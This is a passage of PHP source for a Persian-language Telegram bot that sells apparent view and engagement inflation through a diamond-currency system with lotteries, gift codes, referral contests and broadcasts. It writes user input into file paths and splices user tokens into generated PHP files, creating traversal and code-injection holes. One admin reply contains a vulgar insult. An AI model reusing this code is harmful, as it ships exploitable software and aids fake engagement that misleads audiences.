$Member = explode("\n",$list);
$count = count($Member)-2;
file_put_contents("data/$from_id/com.txt",'none');
for($z = 0;$z <= $count;$z++){
$user = $Member[$z];
if($user != "\n" && $user != " "){
	$id = json_decode(file_get_contents("https://api.telegram.org/bot".API_KEY."/getChat?chat_id=".$user));
	$user2 = $id->result->id;
if($user2 != null){
$coin = file_get_contents("data/$user/golds.txt");
file_put_contents("data/$user/golds.txt",$coin + $wait);
        bot('sendmessage', [
                'chat_id' =>$user,
                'text' =>"🎊 تبریک !!
🎁 از طرف ادمین مقدار $wait الماس هدیه به شما تعلق گرفت ...",
               'parse_mode'=>'html'
	]);
}
}
}
unlink("data/$from_id/wait.txt");
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"✅ با موفقیت به تمام اعضا مقدار $wait الماس ارسال شد !",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'html',
        	'reply_markup'=>$button_manage
	]);
}else{
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"💢 لطفا فقط از کیبورد زیر انتخاب کنید :",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'html',
			       'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'👤مدیریت']],
	  [['text'=>"خیر"],['text'=>"بله"]],
      ],'resize_keyboard'=>true])
	]);
}
}

elseif($bot == "poshtibanii"){            
file_put_contents("data/$from_id/com.txt","none");
Forward($ADMIN[0],$chat_id,$message_id);
bot('sendmessage',[       
'chat_id'=>$chat_id,
'text'=>"پیام شما دریافت شد✅
بزودی پاسخ داده میشود",
]);
}#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
elseif($text == "ساخت کلیکر آی بازدید👁"){
	bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"دوست عزیز اگر تنظیمات ربات ها را کامل کرده اید روی دکمه ی ساخت بزنید تا ربات شما ساحته شود✅🙂
و اگر تنظیمات را کامل نکرده اید از دکمه ی زیر تنظیمات ربات ها را کامل کنید💣⚙️",
'message_id'=>$messageid,
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
  'resize_keyboard'=>true,
  'keyboard'=>[
  [['text'=>"ساخت✅"],['text'=>"تنظیمات💣"]],
   [['text'=>'🔙برگشت🔙']],
   ]
  ])
]);
}

elseif($text == "ساخت✅"){
	if($tedad > 39 && $createclicker2 != 'true'){
	$rand = rand(00000000,123456789); 
$fil = $rand;
mkdir("vipcli/$fil");
mkdir("vipcli/$fil/plugins");
mkdir("vipcli/$fil/helper");
$indexf = file_get_contents("sourceclivip/clicker/index.php");
save("vipcli/$fil/index.php",$indexf);
$indexf1 = file_get_contents("sourceclivip/clicker/settings");
save("vipcli/$fil/settings",$indexf1);
$indexf2 = file_get_contents("sourceclivip/clicker/plugins/click.php");
save("vipcli/$fil/plugins/click.php",$indexf2);
$indexf3 = file_get_contents("sourceclivip/clicker/plugins/scoins.php");
save("vipcli/$fil/plugins/scoins.php",$indexf3);
$indexf4 = file_get_contents("sourceclivip/clicker/plugins/tanzimat.php");
save("vipcli/$fil/plugins/tanzimat.php",$indexf4);
$indexf100 = file_get_contents("sourceclivip/clicker/plugins/tanzimat2.php");
save("vipcli/$fil/plugins/tanzimat2.php",$indexf100);
$indexf5 = file_get_contents("sourceclivip/clicker/helper/index.php");
$indexf5 = str_replace("[*[ADMIN]*]",$adminclicker,$indexf5);
$indexf5 = str_replace("[*[TOKENHELPER]*]",$tokenclicker,$indexf5);
save("vipcli/$fil/helper/index.php",$indexf5);
$index = file_get_contents("sourceclivip/clicker/plugin.php");
$index = str_replace("[*[ADMIN]*]",$adminclicker,$index);
$index = str_replace("[*[IDHELPER]*]",$idclicker,$index);
save("vipcli/$fil/plugin.php",$index);
save("data/$from_id/com.txt","none");  
save("data/$from_id/createclicker.txt","false");  
file_get_contents("https://api.telegram.org/bot$tokenclicker/setwebhook?url=$domainhost/vipcli/$fil/helper/index.php");
$req = $tedad-40;
save("data/$from_id/golds.txt","$req");
 bot('sendMessage', [
'chat_id' => $from_id,
'text'=>"ربات شما با موفقیت ساخته شد♻️
جهت متصل کردن ربات به اکانت مورد نظر بر روی لینک زیر بزنید سپس اطلاعات را تکمیل کنید💣
LiNk:🍿  $domainhost/vipcli/$fil/index.php
شماره پوشه :⚙️ $fil
توجه📌: اگر ربات جوابی نداد یا مشکلی داشت شماره پوشه خود را به پشتیبانی ربات ارسال کنید⚠️
🎗 @cptsha8  
🎮 @cptsha8  ",
'message_id' => $messageid,
'parse_mode'=>"HTML",
 'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'🔙برگشت🔙']],
	      ],'resize_keyboard'=>true])
	]);    
	bot('sendMessage',[
'chat_id'=>$ADMIN,
'text'=>"لطفا بعد از ارسال شماره لینک را حتما کرون جاب کنید",
'parse_mode'=>'MarkDown',
 'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'🔙برگشت🔙']],
	      ],'resize_keyboard'=>true])
	]);   
bot('sendMessage',[
'chat_id'=>$ADMIN,
'text'=>"👇 [$from_id](tg://user?id=$from_id) 👇",
'parse_mode'=>'MarkDown',
 'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'🔙برگشت🔙']],
	      ],'resize_keyboard'=>true])
	]);   
bot('sendMessage',[
'chat_id'=>$ADMIN,
'text'=>"☀️☀️☀️
کلیکر ورژن 2
🛠🛠🛠
$domainhost/vipcli/$fil/index.php
🎉🎉🎉
",
'parse_mode'=>'html',
 'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'🔙برگشت🔙']],
	      ],'resize_keyboard'=>true])
	]);
}else{
bot('sendMessage', [
'chat_id'=>$from_id,
'text'=>"دوست عزیز حساب شما فاقد 40 امتیاز میباشد🌱

جهت خرید الماس  با پشتیبانی در ارتباط باشد🎲
🎗 @cptsha8  
🎮 @cptsha8  ",
'message_id'=>$messageid,
'parse_mode'=>"HTML",
 'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'🔙برگشت🔙']],
	      ],'resize_keyboard'=>true])
	]);
}}

if($text == "تنظیمات💣" or $text == "برگشت به تنظیمات📲"){
	save("data/$from_id/com.txt","none");
bot('sendMessage', [
'chat_id'=>$from_id,
'text'=>"اطلاعات کلیکر را تکمیل کنید✅♻",
'message_id'=>$messageid,
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
  'resize_keyboard'=>true,
  'keyboard'=>[
  [['text'=>"ایدی عددی ادمین"],['text'=>"توکن ربات هلپر"],['text'=>"ایدی ربات هلپر"]],
  	  [['text'=>'🔙برگشت🔙']],
   ]
  ])
]);
}
//
elseif($text == "ایدی عددی ادمین"){
save("data/$from_id/com.txt","adminclicker");
bot('sendMessage', [
'chat_id'=>$from_id,
'text'=>"ایدی عددی مدیر را وارد نمایید🌱",
'message_id'=>$messageid,
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
  'resize_keyboard'=>true,
  'keyboard'=>[
  	  [['text'=>'برگشت به تنظیمات📲']],
   ]
  ])
]);
}
elseif($command == 'adminclicker'){
save("data/$chat_id/adminclicker.txt","$text");
bot('sendmessage', [
'chat_id' => $chat_id,
'text'=>"تنظیم شد!",
'message_id'=>$messageid,
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
  'resize_keyboard'=>true,
  'keyboard'=>[
  	  [['text'=>'برگشت به تنظیمات📲']],
   ]
  ])
]);
save("data/$from_id/com.txt","none");
}
//
elseif($text == "توکن ربات هلپر"){
save("data/$from_id/com.txt","tokenclicker");
bot('sendMessage', [
'chat_id'=>$from_id,
'text'=>"توکن هلپر را وارد نمایید🌱
توجه : حالت اینلاین را در ربات فعال کنید",
'message_id'=>$messageid,
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
  'resize_keyboard'=>true,
  'keyboard'=>[
  	  [['text'=>'برگشت به تنظیمات📲']],
   ]
  ])
]);
}
elseif($command == 'tokenclicker'){
save("data/$chat_id/tokenclicker.txt","$text");
bot('sendmessage', [
'chat_id' => $chat_id,
'text'=>"تنظیم شد!",
'message_id'=>$messageid,
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
  'resize_keyboard'=>true,
  'keyboard'=>[
  	  [['text'=>'برگشت به تنظیمات📲']],
   ]
  ])
]);
save("data/$from_id/com.txt","none");
}
//
elseif($text == "ایدی ربات هلپر"){
save("data/$from_id/com.txt","idclicker");
bot('sendMessage', [
'chat_id'=>$from_id,
'text'=>"ایدی ربات هلپر را بدون @ وارد نمایید",
'message_id'=>$messageid,
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
  'resize_keyboard'=>true,
  'keyboard'=>[
  	  [['text'=>'برگشت به تنظیمات📲']],
   ]
  ])
]);
}
elseif($command == 'idclicker'){
save("data/$chat_id/idclicker.txt","$text");
bot('sendmessage', [
'chat_id' => $chat_id,
'text'=>"تنظیم شد!",
'message_id'=>$messageid,
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
  'resize_keyboard'=>true,
  'keyboard'=>[
  	  [['text'=>'برگشت به تنظیمات📲']],
   ]
  ])
]);
save("data/$from_id/com.txt","none");
}
#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
elseif($text == "کیوسک بخت آزمایی🎰"){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"خوب💥
حالا باید از بلیط های شانسی زیر یکی رو انتخاب کنی تا بهت از 1 تا 6 الماس بدم😼
فقط روزی یه بر میتونی تست کنی🎃",
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
  'resize_keyboard'=>true,
  'keyboard'=>[
  [['text'=>"❤️"],['text'=>"🧡"],['text'=>'💛']],
  [['text'=>"💚"],['text'=>"💙"],['text'=>'💜']],
   [['text'=>'🔙برگشت🔙']],
   ]
  ])
]);
}



elseif($text == "❤️" or $text == "🧡" or $text == "💛" or $text == "💚"or $text == "💙" or $text == "💜" ){
		$d = file_get_contents("data/$from_id/date.txt");
      date_default_timezone_set('Asia/Tehran');
       $t = date('Y/m/d');
      if($d != $t){
      $x = rand(1,5);
      $tedad += $x;
      file_put_contents("data/$from_id/golds.txt", $tedad);
file_put_contents("data/$from_id/date.txt", $t);

      bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"مبارکت باشه 💐
تعداد $x الماس شانسی گرفتی🎪
خسته نباشی🏋🏻️‍♀️
",'parse_mode'=>'MarkDown',
    ]);
    } else {
    bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"قبلا الماس امروزتو گرفتی🎨
برو فردا بیا🎰",'parse_mode'=>'MarkDown',
     ]);
    }
}
#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
		elseif($text == "💸افزایش الماس کاربر" && in_array($chat_id,$ADMIN)){
			file_put_contents("data/$from_id/com.txt","sendauto");
  bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"ایدی عددی کاربر مورد نظر را ارسال کنید :",'parse_mode'=>'MarkDown',
        	'reply_markup'=>json_encode([
	'resize_keyboard'=>true,
	'keyboard'=>[
	[['text'=>"🔙برگشت🔙"]],
	[['text'=>""]]
	]
	])
	]);
	}
//اپن و نوشته شده توسط کانال : @cptsha8
	elseif($bot == "sendauto" && in_array($chat_id,$ADMIN)){
	if(is_numeric($text)){
	file_put_contents('data/'.$from_id."/adad.txt",$text);

bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"تعداد الماس را وارد کنید...",
    'parse_mode'=>'html',
    'reply_markup'=>$button_manage
  ]);
  
  file_put_contents("data/$from_id/com.txt","sendauto2");
	}else{
		if($text != "🔙برگشت🔙"){
	bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"لطفا آیدی عددی را صحیح وارد کنید...",
    'parse_mode'=>'html',
    'reply_markup'=>$button_manage
  ]);
  file_put_contents("data/$from_id/com.txt","none");
		}
	}
	}
	
	elseif($bot == "sendauto2" && in_array($chat_id,$ADMIN)){
	if(is_numeric($text)){
	$teee = file_get_contents('data/'.$adad."/golds.txt");
file_put_contents('data/'.$adad."/golds.txt",$teee+$text);

bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"تعداد $text الماس به کاربر مورد نظر ارسال شد ✅",
    'parse_mode'=>'html',
    'reply_markup'=>$button_manage
  ]);
bot('sendmessage',[
    'chat_id'=>$adad,
    'text'=>"تعداد $text الماس به شما تعلق گرفت✅",
    'parse_mode'=>'html'
  ]);
file_put_contents("data/$from_id/com.txt","none");
	}else{
		if($text != "🔙برگشت🔙"){
	bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"لطفا یک عدد لاتین وارد کنید...",
    'parse_mode'=>'html',
    'reply_markup'=>$button_manage
  ]);
  file_put_contents("data/$from_id/com.txt","none");
	}
	}
	}

elseif($text == "🔖 آمار فعلی ربات"){
	    $user = file_get_contents("Member.txt");
    $member_id = explode("\n",$user);
    $member_count = count($member_id) -1;
	bot('sendmessage', [
  'chat_id' =>$chat_id,
  'text' =>"🔄Louding",
	'reply_to_message_id' => $message_id,
  'parse_mode'=>'html',
	]);
	sleep(0.1);
	bot('editmessagetext',[
    'chat_id'=>$chat_id,
     'message_id'=>$message_id + 1,
    'text'=>"🔄Louding●",
  ]);
  sleep(0.1);
  bot('editmessagetext',[
    'chat_id'=>$chat_id,
     'message_id'=>$message_id + 1,
    'text'=>"🔄Louding●●",
    ]);
    sleep(0.1);
  bot('editmessagetext',[
    'chat_id'=>$chat_id,
     'message_id'=>$message_id + 1,
    'text'=>"🔄Louding●●●",
    ]);
    sleep(0.1);
	bot('editmessagetext',[
    'chat_id'=>$chat_id,
     'message_id'=>$message_id + 1,
    'text'=>"🔄Louding●",
  ]);
  sleep(0.1);
  bot('editmessagetext',[
    'chat_id'=>$chat_id,
     'message_id'=>$message_id + 1,
    'text'=>"🔄Louding●●",
    ]);
    sleep(0.1);
  bot('editmessagetext',[
    'chat_id'=>$chat_id,
     'message_id'=>$message_id + 1,
    'text'=>"🔄Louding●●●",
    ]);
  sleep(0.1);
  bot('editmessagetext',[
    'chat_id'=>$chat_id,
     'message_id'=>$message_id + 1,
    'text'=>"📜آمار ربات ویوپنل

💑تعداد اعضای ربات: $member_count
📌سفارشات: $sof
🚀پینگ سرور: $load[0]
⏱ساعت : $time
📟تاریخ : $date",
  ]);
}
//اپن و نوشته شده توسط کانال : @cptsha8
elseif($text == "📭پیام همگانی" && in_array($chat_id,$ADMIN)){
    file_put_contents("data/$from_id/com.txt","send");
	
	bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>" پیام مورد نظر رو در قالب متن بفرستید:",
    'parse_mode'=>'html',
    'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'👤مدیریت']],
      ],'resize_keyboard'=>true])
  ]);
}
elseif($bot == "send" && in_array($chat_id,$ADMIN)){
    file_put_contents("data/$from_id/com.txt","noone");
    
	bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"✅ پیام همگانی فرستاده شد.",
  ]);
		$all_member = fopen( "Member.txt", 'r');
		while( !feof( $all_member)) {
 			$user = fgets( $all_member);
	$id = json_decode(file_get_contents("https://api.telegram.org/bot".API_KEY."/getChat?chat_id=".$user));
	$user2 = $id->result->id;
if($user2 != null){
			if($sticker_id != null){
	bot('SendSticker',[
	'chat_id'=>$user,
	'sticker'=>$sticker_id
	]);
			}
			elseif($video_id != null){
	bot('SendVideo',[
	'chat_id'=>$user,
	'video'=>$video_id,
        'caption'=>$caption
	]);
			}
			elseif($voice_id != null){
	bot('SendVoice',[
	'chat_id'=>$user,
	'voice'=>$voice_id,
	'caption'=>$caption
	]);
			}
			elseif($file_id != null){
	bot('SendDocument',[
	'chat_id'=>$user,
	'document'=>$file_id,
	'caption'=>$caption
	]);
			}
			elseif($music_id != null){
	bot('SendAudio',[
	'chat_id'=>$user,
	'audio'=>$music_id,
	'caption'=>$caption
	]);
			}
			elseif($photo_id != null){
	bot('sendphoto',[
	'chat_id'=>$user,
	'photo'=>$photo_id,
	'caption'=>$caption
	]);
			}
			elseif($text != null){
	bot('sendMessage', [
	'chat_id' =>$user,
	'text' =>$text,
	'parse_mode' =>"html",
	'disable_web_page_preview' =>"true"
	]);
			}
}
		}
}
elseif($text=="پشتیبانی👨🏻‍💻"){
save("data/$from_id/com.txt","poshtibani");
	bot('sendMessage',[
	'chat_id'=>$chat_id,
'text'=>"لطفا پیام خود را ارسال کنید😎",
'parse_mode'=>'Markdown',
  'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'🔙برگشت🔙']],
      ],'resize_keyboard'=>true])
	
]);
}
elseif($reply != "" && $chat_id == $ADMIN[0]){
bot('sendmessage',[
'chat_id'=>$reply,
'text'=>"📬پاسخ پیام شما از طرف پشتیبانی

$text",
'parse_mode'=>'HTML',
]);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"پیام شما به کاربر مورد نظر ارسال شد📮",
'parse_mode'=>'MarkDown',
]);
}
elseif($bot == "poshtibani"){            
file_put_contents("data/$from_id/com.txt","none");
Forward($ADMIN[0],$chat_id,$message_id);
bot('sendmessage',[       
'chat_id'=>$chat_id,
'text'=>"پیام شما دریافت شد✅
بزودی پاسخ داده میشود",
]);
}

elseif ($text == "بلاک کاربر❌" && $chat_id == $ADMIN[0] ){
       
        file_put_contents("data/$from_id/meti.txt", "pen");
       bot('sendmessage', [
            'chat_id' => $chat_id,
            'text' => "فقط ایدی عددیشو بفرست تا بلاک بشه از ربات 😡",
            'reply_to_message_id'=>$message_id,
        ]);
    } elseif ($php08 == 'pen') {
        $myfile2 = fopen("data/pen.txt", 'a') or die("Unable to open file!");
        fwrite($myfile2, "$text\n");
        fclose($myfile2);
        file_put_contents("data/$from_id/meti.txt", "No");
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => " با موفقیت بلاکش کردم 😤
 ایدیش هم 
 $text ",
 'reply_to_message_id'=>$message_id,
            'parse_mode' => "MarkDown",
        ]);
    } 


elseif ($text == "انبلاک کاربر✅" && $chat_id == $ADMIN[0]){
        
        file_put_contents("data/$from_id/meti.txt", "unpen");
       bot('sendmessage', [
            'chat_id' => $chat_id,
            'text' => "خوب ی بخشیدی حالا . ایدی عددیشو بدع تا انبلاکش کنم 😕",
            'reply_to_message_id'=>$message_id,
'reply_markup'=>$back_keyboard
        ]);
    } elseif ($php08 == 'unpen') {
        $newlist = str_replace($text, "", $penlist);
        file_put_contents("data/pen.txt", $newlist);
        file_put_contents("data/$from_id/meti.txt", "No");
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "حله انبلاک کردمش
 ایدیش هم 
 $text ",
 'reply_to_message_id'=>$message_id,
        ]);
    }
  elseif($text == 'آیدی کاربر👕'){
  save("other/$from_id/com.txt","set idtaraf");
  SendChatAction($chat_id,"typing");
  SendMessage($chat_id,"<i>🅾️ ایدی عددی را وارد کنید:</i>","html","true",$button_manage);
  }
elseif($bot == 'set idtaraf'){
  save("other/$from_id/com.txt","none");
 $info = json_decode(
 file_get_contents("https://api.telegram.org/bot".API_KEY."/getChat?chat_id=$text")
 );
 if ($info->ok == true)
 {
   SendMessage($chat_id,"<i>✅ آیدی حروفی :$info->result->username</i>","html","true",$button_manage);
 }
 }
elseif($text == "📮فوروارد همگانی" && in_array($chat_id,$ADMIN)){
    file_put_contents("data/$from_id/com.txt","fwd");
	
	bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"پیام خودتون را فروراد کنید:",
    'parse_mode'=>'html',
    'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'👤مدیریت']],
      ],'resize_keyboard'=>true])
  ]);
}
elseif($bot == "fwd" && in_array($chat_id,$ADMIN)){
    file_put_contents("data/$from_id/com.txt","none");
	bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"با موفقیت فروارد شد.",
  ]);

	$all_member = fopen( "Member.txt", "r");
		while( !feof( $all_member)) {
 			$user = fgets( $all_member);
	$id = json_decode(file_get_contents("https://api.telegram.org/bot".API_KEY."/getChat?chat_id=".$user));
	$user2 = $id->result->id;
if($user2 != null){
			    bot('ForwardMessage',[
        'chat_id'=>$user,
        'from_chat_id'=>$chat_id,
        'message_id'=>$message_id
    ]);
}
		}
}

elseif($text == '☢کد رایگان' && in_array($chat_id,$ADMIN)){
file_put_contents("data/$from_id/com.txt","code free");
file_put_contents("data/$from_id/kodomadmin.txt", "$first");
 bot('sendMessage',[
     'chat_id'=>$chat_id,
     'text'=>"☢ کد مورد نظر رو وارد کنید",
     'parse_mode'=>'html'
 ]);
}
elseif($bot == "code free"){
file_put_contents("data/$from_id/com.txt","number coins");
file_put_contents("admin/code/$text.txt","false");
file_put_contents("data/$from_id/ali.txt",$text);
 bot('sendMessage',[
     'chat_id'=>$chat_id,
     'text'=>"حالا تعداد الماس ها را تعیین کنید.",
     'parse_mode'=>'html'
 ]);
}
elseif($bot == "number coins"){
file_put_contents("admin/coins/$ali.txt",$text);
file_put_contents("data/$from_id/com.txt","none");
 bot('sendMessage',[
     'chat_id'=>$chat_id,
     'text'=>"☢ کد ثبت شد.",
     'parse_mode'=>'html'
 ]);
 
 bot('sendMessage',[
     'chat_id'=>$channel,
     'text'=>"تا ثانیه های دیگر کد گذشته خواهد شد🗣
آماده باشید😊",
     'parse_mode'=>'html'
 ]);
 sleep(25);
 bot('sendMessage',[
     'chat_id'=>$channel,
     'text'=>"1⃣",
     'parse_mode'=>'html'
 ]);
 sleep(15);
 bot('sendMessage',[
     'chat_id'=>$channel,
     'text'=>"2⃣",
     'parse_mode'=>'html'
 ]);
 sleep(3);
 bot('sendMessage',[
     'chat_id'=>$channel,
     'text'=>"3⃣",
     'parse_mode'=>'html'
 ]);
  sleep(5);
 bot('sendphoto',[
 'chat_id'=>$channel,
 'photo'=>"http://www.iloveheartstudio.com/-/p.php?t=new%20code%20is%20creat:%0D%0A%0D%0A%0D%0A%0D%0A$ali%20&bc=FF0000&tc=FFFFFF&hc=000000&f=t&uc=true&ts=true&ff=PNG&w=500&ps=sq",
 'caption'=>"زود کد رو بزن تا نزدنش😉"
 ]);
 bot('sendMessage',[
     'chat_id'=>$channel,
     'text'=>"کد هدیه جدید ساخته شد♥️

👤کد رو $kodomadmin ساخت🗣

کد در عکس بالا نوشته شده🃏

سریع عکس بالا رو باز کن و کد توی عکس رو در بخش کد هدیه ربات وارد کن🀄️

🔻اولین نفری که کد رو وارد کنه برنده میشه🔺

💠تعداد الماس: $text

🎈تاریخ◀️ $date   🎈ساعت◀️ $time
🤖ربات : @likeviewtell_bot",
     'parse_mode'=>'html',
     'reply_markup'=>json_encode([
         'inline_keyboard'=>[
             [
                 ['text'=>"ویوپنل کاج",'url'=>"https://telegram.me/likeviewtell_bot"]
             ]]
     ])
 ]);

}  


//اپن و نوشته شده توسط کانال : @cptsha8



//......................................................................//
//اپن و نوشته شده توسط کانال : @cptsha8
//...........//
elseif($text == 'پاک کردن نفرات چالش❌' && in_array($chat_id,$ADMIN)){
Deletefolder("referral");
bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"حله داد پاکشون کردم کص ننه بد خواهت",
        'parse_mode'=>'MarkDown',
        	'reply_markup'=>$button_official_fa
]);}
//.............................................................................................................//
elseif($text == "کاهش الماس کاربر" && in_array($chat_id,$ADMIN)){
			file_put_contents("data/$from_id/com.txt","remove");
  bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"ایدی عددی کاربر مورد نظر را ارسال کنید :",'parse_mode'=>'MarkDown',
        	'reply_markup'=>json_encode([
	'resize_keyboard'=>true,
	'keyboard'=>[
	[['text'=>"🔙برگشت🔙"]],
	[['text'=>""]]
	]
	])
	]);
	}

	elseif($bot == "remove" && in_array($chat_id,$ADMIN)){
	if(is_numeric($text)){
	file_put_contents('data/'.$from_id."/adad1.txt",$text);

bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"تعداد الماس را وارد کنید...",
    'parse_mode'=>'html',
    'reply_markup'=>$button_manage
  ]);
  
  file_put_contents("data/$from_id/com.txt","remove2");
	}else{
		if($text != "🔙برگشت🔙"){
	bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"لطفا آیدی عددی را صحیح وارد کنید...",
    'parse_mode'=>'html',
    'reply_markup'=>$button_manage
  ]);
  file_put_contents("data/$from_id/com.txt","none");
		}
	}
	}
	
	elseif($bot == "remove2" && in_array($chat_id,$ADMIN)){
	if(is_numeric($text)){
	$teee = file_get_contents('data/'.$adad1."/golds.txt");
file_put_contents('data/'.$adad1."/golds.txt",$teee-$text);

bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"از الماس های کاربر به تعداد $text کم شد",
    'parse_mode'=>'html',
    'reply_markup'=>$button_manage
  ]);
bot('sendmessage',[
    'chat_id'=>$adad1,
    'text'=>"به دلیل زیر پا گزاشتن قوانین و گرفتن زیر مجموعه فیک از شما به تعداد 
$text
الماس کم میشود😒

ادمین👇🏻
@cptsha8  
@cptsha8  ",
    'parse_mode'=>'html'
  ]);
file_put_contents("data/$from_id/com.txt","none");
	}else{
		if($text != "🔙برگشت🔙"){
	bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"لطفا یک عدد لاتین وارد کنید...",
    'parse_mode'=>'html',
    'reply_markup'=>$button_manage
  ]);
  file_put_contents("data/$from_id/com.txt","none");
	}
	}
	}
//.............................................................................................................//
elseif($text == "ارسال برترین ها" && in_array($chat_id,$ADMIN)){
	 $bests = BestFind();
        $rank = rank($from_id);
        $str = "";
        foreach($bests as $value){
             $str .= "💥 رتبه {$value['rank']}:\n👤 ایدی عددی: <a href='tg://user?id={$value['id']}'>{$value['id']}</a>\n🔻 تعداد زیرمجموعه: {$value['referral']}\n\n";
        }
        $gsd = getStartDay(date('Y'),date('m'),date('d'));
        $gsd -= time();
        $h = floor($gsd/3600); $gsd %= 3600;
        $i = floor($gsd/60); $gsd %= 60;
     $endt = "$h:$i:$gsd";
      $refers = file_get_contents("referral/$from_id");
       $refers = number_format($refers);
    include 'getGift.php';
		bot('SendMessage',[
		'chat_id'=>$channel,
		'text'=>"برترین ها👑: \n\n$str\n💣 $endt تا پایان مسابقه ی امروز 💣
⛓ پایان مسابقه ساعت 24:00 ⛓
جایزه برندگان :
🥇نفر اول : 30 الماس🎭
🥈نفر دوم : 20 الماس🎭
🥉نفر سوم : 10 الماس🎭
📊تعداد زیر مجموعه های شما تا الان : $refers 🎉
🌟 رتبه فعلی شما : #$rank",
         'parse_mode'=>'html'
		]);
		bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"ارسال شد",
        'parse_mode'=>'MarkDown',
        	'reply_markup'=>$button_official_fa
]);}
#=====================

   #+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 elseif($text == "✨ساخت ویوپنل✨"){
	bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"دوست عزیز اگر تنظیمات ربات ها را کامل کرده اید روی دکمه ی ساخت بزنید تا ربات شما ساحته شود✅🙂
و اگر تنظیمات را کامل نکرده اید از دکمه ی زیر تنظیمات ربات ها را کامل کنید💣⚙️",
'message_id'=>$messageid,
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
  'resize_keyboard'=>true,
  'keyboard'=>[
  [['text'=>"ساخت ویوپنل اختصاصی🌞"],['text'=>"[⚙️]تنظیمات[⚙️]"]],
   [['text'=>'🔙برگشت🔙']],
   ]
  ])
]);
}
 
 elseif($text == "ساخت ویوپنل اختصاصی🌞"){
	if($tedad > 99){
	$rand = rand(00000000,123456789); 
$fil = $rand;
mkdir("BOT/$fil");
mkdir("BOT/$fil/data");
mkdir("BOT/$fil/spam");
$indexf = file_get_contents("source/panel/index.php");
$indexf = str_replace("[*[ADMIN]*]",$idadmin,$indexf);
$indexf = str_replace("[*[*TOKEN*]*]",$tokenbot,$indexf);
$indexf = str_replace("[*[IDCHANNEL]*]",$idchannel,$indexf);
save("BOT/$fil/index.php",$indexf);
$indexf1 = file_get_contents("source/panel/mem.jpg");
save("BOT/$fil/mem.jpg",$indexf1);
save("data/$from_id/com.txt","none");  
file_get_contents("https://api.telegram.org/bot$tokenbot/setwebhook?url=$domainhost/BOT/$fil/index.php");
$req = $tedad-100;
save("data/$from_id/golds.txt","$req");
 bot('sendMessage', [
'chat_id' => $from_id,
'text'=>"ربات شما با موفقیت ساخته شد به ربات خود رفته و دستور /start را ارسال کنید",
'message_id' => $messageid,
'parse_mode'=>"HTML",
 'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'🔙برگشت🔙']],
	      ],'resize_keyboard'=>true])
	]);  
bot('sendMessage',[
'chat_id'=>000,
'text'=>"👇 [$from_id](tg://user?id=$from_id) 👇
ویوپنل ساخت ",
'parse_mode'=>'MarkDown',
 'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'🔙برگشت🔙']],
	      ],'resize_keyboard'=>true])
	]);   
}else{
bot('sendMessage', [
'chat_id'=>$from_id,
'text'=>"دوست عزیز حساب شما فاقد 50 امتیاز میباشد🌱

جهت خرید الماس  با پشتیبانی در ارتباط باشد🎲
🎗 @cptsha8  
🎮 @cptsha8  ",
'message_id'=>$messageid,
'parse_mode'=>"HTML",
 'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'🔙برگشت🔙']],
	      ],'resize_keyboard'=>true])
	]);
}}

if($text == "[⚙️]تنظیمات[⚙️]" or $text == "[⚙️]برگشت به تنظیمات[⚙️]"){
	save("data/$from_id/com.txt","none");
bot('sendMessage', [
